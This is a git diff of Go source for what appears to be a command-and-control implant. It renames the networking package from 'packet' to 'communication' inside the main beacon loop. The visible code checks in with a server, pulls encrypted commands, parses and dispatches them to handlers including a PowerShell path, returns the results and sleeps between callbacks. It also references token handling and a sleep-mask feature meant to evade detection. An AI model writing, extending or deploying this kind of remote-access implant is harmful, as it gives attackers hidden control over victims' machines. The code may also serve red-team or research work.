@@ -5,6 +5,7 @@ import (
 	"encoding/hex"
 	"errors"
 	"fmt"
+	"main/communication"
 	"main/config"
 	"main/crypt"
 	"main/packet"
@@ -42,7 +43,7 @@ func main() {
 		fmt.Println(errDPI)
 	}
 
-	errFirstBlood := packet.FirstBlood()
+	errFirstBlood := communication.FirstBlood()
 	if errFirstBlood != nil {
 		fmt.Println(errFirstBlood)
 		time.Sleep(3 * time.Second)
@@ -51,34 +52,34 @@ func main() {
 
 	errInit := services.Init()
 	if errInit != nil {
-		packet.ErrorProcess(errInit)
+		communication.ErrorProcess(errInit)
 	}
 
 	var Token uintptr
 	var powershellImport []byte
 	for {
-		data, err := packet.PullCommand()
+		data, err := communication.PullCommand()
 		if data != nil && err == nil {
 			totalLen := len(data)
 			if totalLen > 0 {
 				_ = data[totalLen-crypt.HmacHashLen:]
 				restBytes := data[:totalLen-crypt.HmacHashLen]
-				decrypted, errPacket := packet.DecryptPacket(restBytes)
+				decrypted, errPacket := communication.DecryptPacket(restBytes)
 				if errPacket != nil {
-					packet.ErrorProcess(errPacket)
+					communication.ErrorProcess(errPacket)
 					continue
 				}
 				_ = decrypted[:4]
 				lenBytes := decrypted[4:8]
-				packetLen := packet.ReadInt(lenBytes)
+				packetLen := communication.ReadInt(lenBytes)
 				decryptedBuf := bytes.NewBuffer(decrypted[8:])
 				for {
 					if packetLen <= 0 {
 						break
 					}
-					cmdType, cmdBuf, errParse := packet.ParsePacket(decryptedBuf, &packetLen)
+					cmdType, cmdBuf, errParse := communication.ParsePacket(decryptedBuf, &packetLen)
 					if errParse != nil {
-						packet.ErrorProcess(errParse)
+						communication.ErrorProcess(errParse)
 						continue
 					}
 					if cmdBuf != nil {
@@ -157,7 +158,7 @@ func main() {
 							callbackType = 0
 						case packet.CMD_TYPE_PS:
 							result, err = services.CmdPs(cmdBuf)
-							resultType := packet.ReadInt(cmdBuf)
+							resultType := communication.ReadInt(cmdBuf)
 							//fmt.Println(resultType)
 							if resultType == 0 {
 								callbackType = 17
@@ -235,15 +236,15 @@ func main() {
 						}
 						// convert charset here
 						if err != nil {
-							packet.ErrorProcess(err)
+							communication.ErrorProcess(err)
 						} else {
-							packet.DataProcess(callbackType, result)
+							communication.DataProcess(callbackType, result)
 						}
 					}
 				}
 			}
 		} else if err != nil {
-			packet.ErrorProcess(err)
+			communication.ErrorProcess(err)
 		}
 		/*if config.Sleep_mask {
 			packet.DoSuspendThreads()
@@ -260,7 +261,7 @@ func main() {
 		waitTime, err := services.CallbackTime()
 		if err != nil {
 			fmt.Println(err)
-			packet.ErrorProcess(err)
+			communication.ErrorProcess(err)
 		}
 		time.Sleep(waitTime)
 
